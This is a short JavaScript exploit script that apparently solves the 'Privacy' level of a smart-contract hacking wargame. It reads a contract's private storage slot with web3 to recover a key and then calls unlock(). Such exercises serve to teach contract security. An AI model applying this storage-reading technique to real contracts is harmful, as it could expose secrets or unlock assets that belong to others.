const level12 = async (web3, Privacy) => {

    const targetAddress = '0x1dc5c3330cb64729c6e59141e955afc41a151e8f';
    console.log(`Exploiting Level12 target ${targetAddress}...`);

    console.log('Retrieving the target...');
    const target = await Privacy.at(targetAddress);

    console.log('Retrieving data[2]...');
    const data = await web3.eth.getStorageAt(targetAddress, 3);
    const key = data.slice(0, 34); // 2 chars for '0x' + 16 bytes * 2 hex chars each

    console.log('Unlocking the contract...');
    await target.unlock(key);
};

module.exports = level12;